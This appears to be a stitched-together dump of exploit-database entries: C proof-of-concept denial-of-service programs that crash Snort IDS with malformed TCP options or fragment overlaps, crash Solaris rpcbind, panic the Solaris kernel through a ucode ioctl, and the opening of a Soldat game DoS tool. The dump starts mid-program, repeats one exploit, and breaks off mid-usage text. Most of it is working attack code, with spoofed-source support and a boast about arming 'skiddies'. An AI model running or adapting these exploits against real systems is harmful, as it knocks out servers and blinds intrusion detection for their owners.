if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
perror("socket");
exit(0);
}

if (sendto(s, datagram, ip->ip_len, 0, (struct sockaddr *) &addr,
sizeof(struct sockaddr_in)) == -1) {
perror("sendto");
exit(-1);
}

printf("packet sent!\n");

close(s);
return 0;

}
source: http://www.securityfocus.com/bid/12084/info
 
Snort is reported prone to a remote denial of service vulnerability. The vulnerability is reported to exist in the DecodeTCPOptions() function of 'decode.c', and is as a result of a failure to sufficiently handle malicious TCP packets.
 
A remote attacker may trigger this vulnerability to crash a remote Snort server and in doing so may prevent subsequent malicious attacks from being detected. 

#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <netinet/in.h> 
#include <netinet/tcp.h> 
#include <netinet/ip.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <arpa/inet.h> 
#include <getopt.h> 

#define BINARYBETA 

void printUsage() 
{ 
printf("./angelDust -D <destination_ip> -S <source_ip>\n"); 
printf("Please as with all inhalants use wisely in the comfort of your own home\n"); 
} 


int main(int argc, char **argv) 
{ 
int s; 
int next_opt; 
const char* const short_opts="hD:S:"; 
//either one there both not valid protocol 
//char opts[] = "\x02\04\xff\xff"; 
char opts[] = "\x06\00\xff\xff"; 

char datagram[64]; 
struct sockaddr_in addr; 
struct ip *ip = (struct ip *) datagram; 
struct tcphdr *tcp; 
char dst_ip[16]; 
char src_ip[16]; 
#ifdef BINARYBETA 
if(strstr (argv[0],"/angelDust") == NULL) 
{ 
printf("Cmon you stupid llama, put the original name back\n"); 
exit(-1); 
} 
#endif 

if(argc < 2) 
{ 
printf("angelDust by Antimatt3r\n"); 
printf("pr0ps to Marcin for finding this bug\n"); 
printf("pr0ps to me for making something useful out of it for the skiddies\n"); 
exit(-1); 
} 


const struct option long_opts[]= 
{ 
{"help", 0, NULL,'h'}, 
{"destination_ip",1,NULL,'D'}, 
{"source_ip",1,NULL,'S'}, 
}; 

strncpy(dst_ip,"127.0.0.1",16); 
strncpy(src_ip,"127.0.0.1",16); 

do 
{ 
next_opt = getopt_long(argc,argv,short_opts,long_opts,NULL); 
switch( next_opt) 
{ 
case 'h' : 
printUsage(); 
return 0; 
case 'D' : 
strncpy(dst_ip,optarg,16); 
break; 
case 'S' : 
strncpy(src_ip,optarg,16); 
break; 

} 
} 
while(next_opt != -1) ; 


memset(&datagram, 0, sizeof(datagram)); 
addr.sin_addr.s_addr = inet_addr(dst_ip); 
addr.sin_port = htons(123); 
addr.sin_family = AF_INET; 

ip->ip_hl = 5; 
ip->ip_v = 4; 
ip->ip_tos = 0; 
ip->ip_id = 0; 
ip->ip_off = 0; 
ip->ip_ttl = 64; 
ip->ip_p = IPPROTO_TCP; 
ip->ip_len = 44; 
ip->ip_sum = 0; 
ip->ip_dst.s_addr = addr.sin_addr.s_addr; 
ip->ip_src.s_addr = inet_addr(src_ip); 

tcp = (struct tcphdr *) (datagram + (ip->ip_hl << 2)); 
tcp->source = htons(321); 
tcp->dest = addr.sin_port; 
tcp->seq = 0; 
tcp->ack = 0; 
tcp->res1 = 0; 
tcp->doff = 6; 
tcp->syn = 0; 
tcp->window = 0x1000; 
tcp->check = 0; 
tcp->urg_ptr = 0; 

memcpy(datagram + 40, opts, sizeof(opts)); 

if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) { 
perror("socket"); 
exit(0); 
} 

if (sendto(s, datagram, ip->ip_len, 0, (struct sockaddr *) &addr, 
sizeof(struct sockaddr_in)) == -1) { 
perror("sendto"); 
exit(-1); 
} 
fprintf(stderr,"Sniff this\n"); 
fprintf(stderr,"..............//"); 
sleep(1); 
fprintf(stderr,"\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b\b\b\b\b\b\b// \n"); 
printf("and choke!\n"); 

close(s); 
return 0; 
} 
/*_------------------------------------------_
 ||------+ Snort <= 2.4.0 Trigger p0c +------||
 ||__________________________________________||
 ||--=[ nitrous [at] vulnfact [dot] com  ]=--||
 ||--=[      VulnFact Security Labs      ]=--||
 ||--=[           21 Ago 2oo5            ]=--||
 ||--=[              Mexico              ]=--||
 ||__________________________________________||
 -__________________________________________-

 Snort <= 2.4.0 SACK TCP Option Error Handling
 Este código envia al  especificado un paquete TCP/IP con 4 bytes extras
 correspondientes al campo TCP Options [TCP Header].
 Estos 4 bytes son "\x05\x02\x00\x00". NOTA !!!: Snort solamente cae cuando se
 esta corriendo en verbose mode (-v).

 Esto solo funciona testeando de una maquina a otra directamente conectadas
 (1 solo salto; Ej. En una red LAN de PC a PC). No funciona desde Internet, por
 que el campo TCP->th_sum es 0 (cero), por lo tanto, el primer Router por donde
 pase este paquete lo descartara por no tener una checksum valida.

 RFC #1072 - TCP Extensions for Long-Delay Paths

 3.2- TCP SACK Option:
     ...
     Kind: 5
     Length: Variable
     +--------+--------+--------+--------+--------+--------+
     | Kind=5 | Length | Relative Origin |   Block Size    |
     +--------+--------+--------+--------+--------+--------+

 Analizando el packete con 'tcpdump' en OpenBSD 3.5 vemos:
 11:17:53.093264 ip: 127.0.0.1.29383 > 127.0.0.1.80: S 213975407:213975407(0) win 5840
 <malformed sack [len 0] ,eol>
 0000: 4500 002c bc4f 0000 ff06 017a 7f00 0001  E..,Å’O..Ã¿..z....
 0010: 7f00 0001 72c7 0050 0cc1 016f 43f1 8422  ....rÃ‡.P.Ã.oCÃ±."
 0020: 6002 16d0 3caf 0000 0502 0000            `..Ã<Â¯......

 Testeado en:
 [+] snort 2.4.0 @ OpenBSD 3.7 GENERIC // Yeah ;)
 [+] snort 2.4.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
 [+] snort 2.3.2 @ Debian Linux 3.1 "Sarge"
 [+] snort 2.3.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
 [+] snort 2.3.0 @ Red Hat Linux 9
 [+] snort 2.2.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
 [+] snort 2.0.0 @ OpenBSD 3.5 GENERIC

 Saludos a vulnfact.com, CRAc, stacked, ran, dex, benn, beck, zlotan, Rowter, Gus, Crypkey,
 protoloco, Falckon, dymitri, #cum ppl, warlord/nologin.org por fuzzball2 fuzzer, gcarrillog,
 JSS, y en especial a Mariit@ ( Sexy Colombiana ;) ). A la musica de "Sussie 4" ;)...
 Federico L. Bossi Bonin
*/

#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<errno.h>
#include<netdb.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
//#define __USE_BSD     1       /* Use BSD's ip header style */
#include<netinet/ip.h>
#define __FAVOR_BSD     1       /* Use BSD's tcp header style */
#include<netinet/tcp.h>

#define IPSIZE  sizeof(struct ip)
#define TCPSIZE sizeof(struct tcphdr)
#define DEFAULT_SRC_IP  "200.31.33.70"

char trigger[] = "\x05\x02\x00\x00"; /* Malformed SACK TCP Option */

int usage(char *name)
{
       fprintf(stderr, "Usage: %s <target> [spoofed srcip]\n", name);
       fprintf(stderr, "\t\tDefault srcip = %s\n", DEFAULT_SRC_IP);

       return 0;
}

int main(int argc, char **argv)
{
       char *packet= (char *) malloc(IPSIZE + TCPSIZE + 4);
       char *srcip = DEFAULT_SRC_IP;
       int sockfd, count;
       int one = 1; /* setsockopt() */
       struct sockaddr_in target;
       struct hostent *host2ip;
       struct ip *IP = (struct ip *) packet;
       struct tcphdr *TCP = (struct tcphdr *) (packet + IPSIZE);

       if(argc < 2)
               return(usage(*argv));

       if(argc == 3)
               srcip = argv[2];

       if((host2ip = gethostbyname(argv[1])) == NULL){
               perror("gethostbyname");
               exit(-1);
       }

       if(getuid() != 0){
               fprintf(stderr, "Ups!, must be r00t to perform RAW sockets\n");
               exit(-1);
       }

       memset(packet, 0x00, sizeof(packet));

       memset(&target, 0x00, sizeof(target));
       target.sin_family       = AF_INET;
       target.sin_port         = htons(64876);
       target.sin_addr         = *((struct in_addr *)host2ip->h_addr);

       /*** BUILDING MALFORMED PACKET ***/
       IP->ip_hl       = 0x05;
       IP->ip_v        = 0x04;
       IP->ip_tos      = 0x00;
       IP->ip_len      = IPSIZE + TCPSIZE + 4;
       IP->ip_id       = 0x00;
       IP->ip_off      = 0x00;
       IP->ip_ttl      = 0xff;
       IP->ip_p        = IPPROTO_TCP;
       IP->ip_sum      = 0x00;
       IP->ip_src.s_addr = inet_addr(srcip);
       IP->ip_dst.s_addr = target.sin_addr.s_addr;

       TCP->th_sport   = htons(31337);
       TCP->th_dport   = target.sin_port;
       TCP->th_seq     = 0x00;
       TCP->th_ack     = 0x00;
       TCP->th_x2      = 0x00;
       TCP->th_off     = 0x06;
       TCP->th_flags   = 0x00; /* NO Syn ;) */
       TCP->th_win     = htons(0xffff);
       TCP->th_sum     = 0x00;
       TCP->th_urp     = 0x00;

       memcpy(packet + IPSIZE + TCPSIZE, trigger, 4);
       /*** END ***/

       if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
               perror("socket");
               exit(-1);
       }

       if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1){
               perror("setsockopt");
               exit(-1);
       }

       printf("-=[ Snort <= 2.4.0 Trigger p0c\n");
       printf("-=[ By nitr0us <nitrous[at]vulnfact[dot]com>\n\n");
       printf("-=[ Sending Malformed TCP/IP Packet...\n");

       if((count = sendto(sockfd, packet, IP->ip_len, 0, (struct sockaddr *)&target, sizeof(target))) == -1){
               perror("sendto");
               close(sockfd);
               exit(-1);
       }

       printf("-=[ Sent %d bytes to %s\n", count, argv[1]);
       printf("-=[ Snort killed !\n");

       close(sockfd);
       return 0;
}

// milw0rm.com [2005-09-12]
/*********************************************************
 * DOS Snort Inline
 * Affected Versions: 2.6.1.1, 2.6.1.2, 2.7.0(beta)
 * Requirements : Frag3 Enabled, Inline, Linux, ip_conntrack disabled
 * Antimatt3r	
 * antimatter@gmail.com
 * Offset needs to be supplied that would cause reassembly for different snort
 * fragmentation reassembly policies. Since the first packet is hardcoded 70-74 offset
 * will trigger the segfault.
 ********************************************************/

#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>


#define NOOP_FRAG_SLED 576
#define NOOP_SHORT 16 


struct addr {
  uint32_t ip;
  char mac[ETH_ALEN];
};

struct dev {
  uint32_t index;
  char name[IFNAMSIZ];
};

int mac_aton(char *, char *);
void usage(char *cmd) {
  fprintf(stderr, "usage: %s <device> <source_ip>  <src_mac> <dst_ip>  <dst_mac>  <offset>\n", cmd);
}

int mac_aton(char *amac, char *nmac) {
  char c;
  int i;
  unsigned int val;

  i = 0;
  while ((*amac != '\0') && (i < ETH_ALEN)) {
    val = 0;
    c = *amac++;
    if (c >= '0' && c <= '9') {
      val = c - '0';
    }
    else if (c >= 'a' && c <= 'f') {
      val = c - 'a' + 10;
    }
    else if (c >= 'A' && c <= 'F') {
      val = c - 'A' + 10;
    }
    else {
      errno = EINVAL;
      return -1;
    }
    val <<= 4;

    c = *amac;
    if (c >= '0' && c <= '9') {
      val |= c - '0';
    }
    else if (c >= 'a' && c <= 'f') {
      val |= c - 'a' + 10;
    }
    else if (c >= 'A' && c <= 'F') {
      val |= c - 'A' + 10;
    }
    else if (c == ':' || c == '\0') {
      val >>= 4;
    }
    else {
      errno = EINVAL;
      return -1;
    }
    if (c != 0) {
      amac++;
    }
    *nmac++ = val & 0xff;
    i++;

    /* We might get a semicolon here - not required. */
    if (*amac == ':') {
      amac++;
    }
  }
  return 0;
}


int in_cksum(u_short *addr, int len) {
int nleft = len;
u_short *w = addr;
int sum = 0;
u_short answer = 0;

  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1) {
    *(u_char *)(&answer) = *(u_char *)w;
    sum += answer;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;

  return answer;
}

int send_morefrag_packet(int sock, struct dev *dev, struct addr *src, struct
addr *dst) {
  struct sockaddr_ll sll;
  struct ether_header *eth;
  struct iphdr *ip;
  struct udphdr *udp;
  u_char *payload;
  char buf[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)+ NOOP_FRAG_SLED];

  memset(&sll, 0, sizeof(sll));
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = dev->index;
  sll.sll_halen = ETH_ALEN;
  memcpy(&sll.sll_addr, dst->mac, ETH_ALEN);

  memset(buf, 0, sizeof(buf));
  eth = (struct ether_header *)buf;
  ip = (struct iphdr *)((char *)eth + sizeof(struct ether_header));
  udp = (struct udphdr *)((char *)ip + sizeof(struct iphdr));
  payload = (u_char *)((char *)udp + sizeof(struct udphdr));

  memset(payload,'\x90',NOOP_FRAG_SLED);


  udp->source = htons(1111);
  udp->dest = htons(1111);
  udp->len =  htons(sizeof(struct udphdr) + NOOP_FRAG_SLED) ;
  udp->check =0;


  ip->version = 4;
  ip->ihl = 5;
  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + NOOP_FRAG_SLED);
  ip->id = 31337;
  ip->ttl = 64;
  ip->frag_off = htons(0x2000);
  ip->protocol = IPPROTO_UDP;
  ip->saddr = src->ip;
  ip->daddr = dst->ip;
  ip->check = in_cksum((u_short *)ip, sizeof(struct iphdr));
  
  memcpy(eth->ether_shost, src->mac, ETH_ALEN);
  memcpy(eth->ether_dhost, dst->mac, ETH_ALEN);
  eth->ether_type = htons(ETH_P_IP);

  if(sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&sll, sizeof(sll)) == -1)
	printf ("error %d %s\n",errno,strerror(errno));
  else
	printf("MF Packet Sent\n");
}

int send_overlap_packet(int sock, struct dev *dev, struct addr *src, struct
addr *dst,int offset) {
  struct sockaddr_ll sll;
  struct ether_header *eth;
  struct iphdr *ip;
  struct udphdr *udp;
  u_char *payload;
  char buf[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)+ NOOP_SHORT ];

  memset(&sll, 0, sizeof(sll));
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = dev->index;
  sll.sll_halen = ETH_ALEN;
  memcpy(&sll.sll_addr, dst->mac, ETH_ALEN);

  memset(buf, 0, sizeof(buf));
  eth = (struct ether_header *)buf;
  ip = (struct iphdr *)((char *)eth + sizeof(struct ether_header));
  udp = (struct udphdr *)((char *)ip + sizeof(struct iphdr));
  payload = (u_char *)((char *)udp + sizeof(struct udphdr));

  memset(payload,'\x90',NOOP_SHORT);

  udp->source = htons(1111);
  udp->dest = htons(1111);
  udp->len =  htons(sizeof(struct udphdr) + NOOP_SHORT) ;
  udp->check =0;

  ip->version = 4;
  ip->ihl = 5;
  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + NOOP_SHORT);
  ip->id = 31337;
  ip->frag_off = ntohs(offset);
  ip->ttl = 64;
  ip->protocol = IPPROTO_UDP;
  ip->saddr = src->ip;
  ip->daddr = dst->ip;
  ip->check = in_cksum((u_short *)ip, sizeof(struct iphdr));
  
  memcpy(eth->ether_shost, src->mac, ETH_ALEN);
  memcpy(eth->ether_dhost, dst->mac, ETH_ALEN);
  eth->ether_type = htons(ETH_P_IP);

  if(sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&sll, sizeof(sll)) == -1)
	printf ("error %d %s\n",errno,strerror(errno));
  else
	printf("2nd Packet Sent\n");
}


int main(int argc, char *argv[]) {
  int sock = 0;
  struct dev dev;
  struct addr src, dst;
  int offset; //play with varying offsets

  if (argc < 7) {
    usage(argv[0]);
    return -1;
  }

  memset(&dev, 0, sizeof(dev));
  strncpy(dev.name, argv[1], IFNAMSIZ-1);
  if((dev.index = if_nametoindex(dev.name)) == 0) {
    perror(argv[1]);
    exit(-1);
  }

  memset(&src, 0, sizeof(src));
  if (inet_aton(argv[2], (struct in_addr *)&src.ip) == 0) {
    fprintf(stderr, "%s: invalid src ip address\n", argv[2]);
    exit(-1);
  }

  if (mac_aton(argv[3], src.mac) < 0) {
    fprintf(stderr, "%s: invalid src hardware address\r\n", argv[3]);
    exit(-1);
  }

  memset(&dst, 0, sizeof(dst));
  if (inet_aton(argv[4], (struct in_addr *)&dst.ip) == 0) {
    fprintf(stderr, "%s: invalid ip address\r\n", argv[2]);
    exit(-1);
  }

  if (mac_aton(argv[5], dst.mac) < 0) {
    fprintf(stderr, "%s: invalid hardware address\r\n", argv[3]);
    exit(-1);
  }
	
  offset = atoi(argv[6]);

  if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
     perror("socket");
     exit(-1);
  }

  if (send_morefrag_packet(sock, &dev, &src, &dst) < 0) {
    perror("send error ");
    exit(-1);
  }
  
  if (send_overlap_packet(sock, &dev, &src, &dst,offset) < 0) {
    perror("send error");
    exit(-1);
  }

  close(sock);

  return 0;
}

// milw0rm.com [2007-03-08]
source: http://www.securityfocus.com/bid/14811/info

Snort is reported prone to a remote denial of service vulnerability. The vulnerability is reported to exist in the 'PrintTcpOptions()' function of 'log.c', and is a result of a failure to sufficiently handle malicious TCP packets.

A remote attacker may trigger this vulnerability to crash a remote Snort server and in doing so may prevent subsequent malicious attacks from being detected.

It should be noted that the vulnerable code path is only executed when Snort is run with the '-v' (verbose) flag. Due to the performance penalty of running the Snort application in verbose mode, it is likely that most production installations of the application are not vulnerable to this issue.

Update: Further messages have stated that other paths to the vulnerable code may be possible. Using the 'frag3' preprocessor, ASCII mode logging, the '-A fast' command-line option, and possibly other options may expose Snort to this vulnerability. Please see the referenced messages for further information. 

/*_------------------------------------------_
||------+ Snort <= 2.4.0 Trigger p0c +------||
||__________________________________________||
||--=[ nitrous [at] vulnfact [dot] com  ]=--||
||--=[      VulnFact Security Labs      ]=--||
||--=[           21 Ago 2oo5            ]=--||
||--=[              Mexico              ]=--||
||__________________________________________||
 -__________________________________________-

Snort <= 2.4.0 SACK TCP Option Error Handling
Este c?digo envia al  especificado un paquete TCP/IP con 4 bytes extras
correspondientes al campo TCP Options [TCP Header].
Estos 4 bytes son "\x05\x02\x00\x00". NOTA !!!: Snort solamente cae cuando se
esta corriendo en verbose mode (-v).

Esto solo funciona testeando de una maquina a otra directamente conectadas
(1 solo salto; Ej. En una red LAN de PC a PC). No funciona desde Internet,
por
que el campo TCP->th_sum es 0 (cero), por lo tanto, el primer Router por
donde
pase este paquete lo descartara por no tener una checksum valida.

RFC #1072 - TCP Extensions for Long-Delay Paths

3.2- TCP SACK Option:
     ...
     Kind: 5
     Length: Variable
     +--------+--------+--------+--------+--------+--------+
     | Kind=5 | Length | Relative Origin |   Block Size    |
     +--------+--------+--------+--------+--------+--------+

Analizando el packete con 'tcpdump' en OpenBSD 3.5 vemos:
11:17:53.093264 ip: 127.0.0.1.29383 > 127.0.0.1.80: S 213975407:213975407(0)
win 5840
<malformed sack [len 0] ,eol>
0000: 4500 002c bc4f 0000 ff06 017a 7f00 0001  E..,??O..??..z....
0010: 7f00 0001 72c7 0050 0cc1 016f 43f1 8422  ....r??.P.??.oC??."
0020: 6002 16d0 3caf 0000 0502 0000            `..??<??......

Testeado en:
[+] snort 2.4.0 @ OpenBSD 3.7 GENERIC // Yeah ;)
[+] snort 2.4.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
[+] snort 2.3.2 @ Debian Linux 3.1 "Sarge"
[+] snort 2.3.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
[+] snort 2.3.0 @ Red Hat Linux 9
[+] snort 2.2.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
[+] snort 2.0.0 @ OpenBSD 3.5 GENERIC

Saludos a vulnfact.com, CRAc, stacked, ran, dex, benn, beck, zlotan, Rowter,
Gus, Crypkey,
protoloco, Falckon, dymitri, #cum ppl, warlord/nologin.org por fuzzball2
fuzzer, gcarrillog,
JSS, y en especial a Mariit@ ( Sexy Colombiana ;) ). A la musica de "Sussie
4" ;)...
Federico L. Bossi Bonin
*/

#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<errno.h>
#include<netdb.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
//#define __USE_BSD     1       /* Use BSD's ip header style */
#include<netinet/ip.h>
#define __FAVOR_BSD     1       /* Use BSD's tcp header style */
#include<netinet/tcp.h>

#define IPSIZE  sizeof(struct ip)
#define TCPSIZE sizeof(struct tcphdr)
#define DEFAULT_SRC_IP  "200.31.33.70"

char trigger[] = "\x05\x02\x00\x00"; /* Malformed SACK TCP Option */

int usage(char *name)
{
        fprintf(stderr, "Usage: %s <target> [spoofed srcip]\n", name);
        fprintf(stderr, "\t\tDefault srcip = %s\n", DEFAULT_SRC_IP);

        return 0;
}

int main(int argc, char **argv)
{
        char *packet= (char *) malloc(IPSIZE + TCPSIZE + 4);
        char *srcip = DEFAULT_SRC_IP;
        int sockfd, count;
        int one = 1; /* setsockopt() */
        struct sockaddr_in target;
        struct hostent *host2ip;
        struct ip *IP = (struct ip *) packet;
        struct tcphdr *TCP = (struct tcphdr *) (packet + IPSIZE);

        if(argc < 2)
                return(usage(*argv));

        if(argc == 3)
                srcip = argv[2];

        if((host2ip = gethostbyname(argv[1])) == NULL){
                perror("gethostbyname");
                exit(-1);
        }

        if(getuid() != 0){
                fprintf(stderr, "Ups!, must be r00t to perform RAW
                sockets\n");
                exit(-1);
        }

        memset(packet, 0x00, sizeof(packet));

        memset(&target, 0x00, sizeof(target));
        target.sin_family       = AF_INET;
        target.sin_port         = htons(64876);
        target.sin_addr         = *((struct in_addr *)host2ip->h_addr);

        /*** BUILDING MALFORMED PACKET ***/
        IP->ip_hl       = 0x05;
        IP->ip_v        = 0x04;
        IP->ip_tos      = 0x00;
        IP->ip_len      = IPSIZE + TCPSIZE + 4;
        IP->ip_id       = 0x00;
        IP->ip_off      = 0x00;
        IP->ip_ttl      = 0xff;
        IP->ip_p        = IPPROTO_TCP;
        IP->ip_sum      = 0x00;
        IP->ip_src.s_addr = inet_addr(srcip);
        IP->ip_dst.s_addr = target.sin_addr.s_addr;

        TCP->th_sport   = htons(31337);
        TCP->th_dport   = target.sin_port;
        TCP->th_seq     = 0x00;
        TCP->th_ack     = 0x00;
        TCP->th_x2      = 0x00;
        TCP->th_off     = 0x06;
        TCP->th_flags   = 0x00; /* NO Syn ;) */
        TCP->th_win     = htons(0xffff);
        TCP->th_sum     = 0x00;
        TCP->th_urp     = 0x00;

        memcpy(packet + IPSIZE + TCPSIZE, trigger, 4);
        /*** END ***/

        if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
                perror("socket");
                exit(-1);
        }

        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) ==
        -1){
                perror("setsockopt");
                exit(-1);
        }

        printf("-=[ Snort <= 2.4.0 Trigger p0c\n");
        printf("-=[ By nitr0us <nitrous[at]vulnfact[dot]com>\n\n");
        printf("-=[ Sending Malformed TCP/IP Packet...\n");

        if((count = sendto(sockfd, packet, IP->ip_len, 0, (struct sockaddr
        *)&target, sizeof(target))) == -1){
                perror("sendto");
                close(sockfd);
                exit(-1);
        }

        printf("-=[ Sent %d bytes to %s\n", count, argv[1]);
        printf("-=[ Snort killed !\n");

        close(sockfd);
        return 0;
}
/*
////////////////////////////////////////////////////////////
// Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS
////////////////////////////////////////////////////////////
//
// Federico L. Bossi Bonin
// fbossi[at]globalST[dot]com[dot]ar
/////////////////////////////////////////////////////


Program received signal SIGSEGV, Segmentation fault.
0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
(gdb) backtrace
#0  0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
#1  0x00013d88 in rpcbproc_taddr2uaddr_com ()
#2  0x000161c0 in rpcb_service_4 ()
(gdb)

*/

#include <string.h>
#include <rpc/rpc.h>

struct xdr {
        long long_arg;
        char *string_arg;
};

typedef struct xdr xdr;
static struct timeval TIMEOUT = { 25, 0 };

bool_t xdr_xdr (XDR *xdrs, xdr *objp) {
        register int32_t *buf;

         if (!xdr_long (xdrs, &objp->long_arg))
                 return FALSE;
         if (!xdr_string (xdrs, &objp->string_arg, 4096))
                 return FALSE;
        return TRUE;
}

char ** str_4(xdr *argp, CLIENT *clnt) {
        static char *clnt_res;

        memset((char *)&clnt_res, 0, sizeof(clnt_res));
        if (clnt_call (clnt, 8,
                (xdrproc_t) xdr_xdr, (caddr_t) argp,
                (xdrproc_t) xdr_wrapstring, (caddr_t) &clnt_res,
                TIMEOUT) != RPC_SUCCESS) {
                return (NULL);
        }
        return (&clnt_res);
}

main(int argc, char *argv[]) {
  CLIENT *c1;
  char *server;
  char **sresult;


  if (argc !=2){
    printf("=============================================================\n");
    printf("Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS\n");
    printf("-------------------------------------------------------------\n");
    printf("Federico L. Bossi Bonin <fbossi@globalST.com.ar>\n");
    printf("=============================================================\n\n");
    printf("usage: %s <IP>\n",argv[0]);
    exit(1);
  }

  server = argv[1];

if ((c1 = clnt_create(server,100000, 4, "tcp")) == NULL){
       clnt_pcreateerror(server);
    exit(1);
  }

  xdr xdrmessage; 
  xdrmessage.long_arg = 0;
  xdrmessage.string_arg="";

  if ((sresult = str_4(&xdrmessage, c1)) == NULL){ 
   clnt_perror(c1, server);
   exit(1);
  }

  clnt_destroy(c1);
  exit(0);
}

// milw0rm.com [2008-10-17]
/*
 * cve-2010-0453.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Denial of service (kernel panic) PoC exploit for the UCODE_GET_VERSION
 * ioctl NULL pointer dereference vulnerability on Solaris/OpenSolaris:
 *
 * http://www.trapkit.de/advisories/TKADV2010-001.txt
 * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-0453
 *
 * Greets to Tobias Klein for discovering the vulnerability and for his
 * detailed (as always) advisory.
 *
 * $Id: cve-2010-0453.c,v 35da14215c84 2010/02/07 19:15:13 argp $
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stropts.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define BUF_SIZE            64
#define UCODE_DEV           "/dev/ucode"

#define UCODE_IOC           (('u' << 24) | ('c' << 16) | ('o' << 8))
#define UCODE_GET_VERSION   (UCODE_IOC | 0)

typedef enum ucode_errno
{
    EM_OK,
    EM_FILESIZE,
    EM_OPENFILE,
    EM_FILEFORMAT,
    EM_HEADER,
    EM_CHECKSUM,
    EM_INVALIDARG,
    EM_NOMATCH,
    EM_HIGHERREV,
    EM_NOTSUP,
    EM_UPDATE,
    EM_SYS,
    EM_NOVENDOR,
    EM_NOMEM
} ucode_errno_t;

struct ucode_get_rev_struct
{
    uint32_t *ugv_rev;
    int ugv_size;
    ucode_errno_t ugv_errno;
};

int
main()
{
    int fd, ret;
    uint32_t buf[BUF_SIZE];
    struct ucode_get_rev_struct in_h;

    memset(buf, 0x41, BUF_SIZE);

    in_h.ugv_rev = buf;
    in_h.ugv_size = 0;

    fd = open(UCODE_DEV, O_RDONLY);
    ret = ioctl(fd, UCODE_GET_VERSION, &in_h);

    printf("[+] ret = %d\n", ret);
    printf("[+] ugv_errno = %d\n", in_h.ugv_errno);

    close(fd);
    return ret;
}

/* EOF */
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define sleepms sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define sleepms(x)  usleep(x * 1000)
    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define FPORT       23083
#define GPORT       23073
#define LPORT       22222
#define BUFFSZ      16384
#define SENDTO(a,b,c,d) \
                    if(sendto(a, b, c, 0, (struct sockaddr *)d, sizeof(struct sockaddr_in)) \
                      < 0) std_err();



void miniproxy(struct sockaddr_in *peer, struct sockaddr_in *peerl, u8 *buff);
int tcp_send_recv(struct sockaddr_in *peer, u8 *in, int inlen, u8 *out, int outlen);
int timeout(int sock);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    int     len,
            attack;
    u16     port;
    u8      *buff;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Soldat <= 1.4.2/2.6.2 multiple DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port]\n"
            "\n"
            "Attacks:\n"
            " 1 = clients crash caused by too long strings on the screen\n"
            "     game server exploited through the file transfer por %hu\n"
            " 2 = as above but exploited through a long chat message, default port %hu\n"
            " 3 = denial of service through file transfer port (dedicated servers only)\n"
